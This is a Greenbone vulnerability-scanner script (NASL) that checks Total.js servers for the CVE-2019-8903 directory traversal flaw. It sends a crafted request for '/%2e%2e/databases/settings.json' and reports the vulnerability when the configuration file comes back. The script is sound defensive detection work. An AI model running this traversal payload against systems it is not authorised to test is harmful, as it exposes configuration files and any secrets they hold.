# Copyright (C) 2019 Greenbone Networks GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (C) of the respective author(s)
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:totaljs:total.js";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142119");
  script_version("$Revision: 14084 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-11 09:36:28 +0100 (Mon, 11 Mar 2019) $");
  script_tag(name:"creation_date", value:"2019-03-11 14:51:32 +0700 (Mon, 11 Mar 2019)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2019-8903");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Total.js Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_totaljs_detect.nasl");
  script_mandatory_keys("totaljs/detected");

  script_tag(name:"summary", value:"Total.js is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"See the vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/");
  script_xref(name:"URL", value:"https://snyk.io/vuln/SNYK-JS-TOTALJS-173710");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/%2e%2e/databases/settings.json";
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "HTTP/1\.. 200 OK" && res =~ '\\{"') {
  report = 'It was possible to obtain the settings.json file at ' +
           report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResponse:\n\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
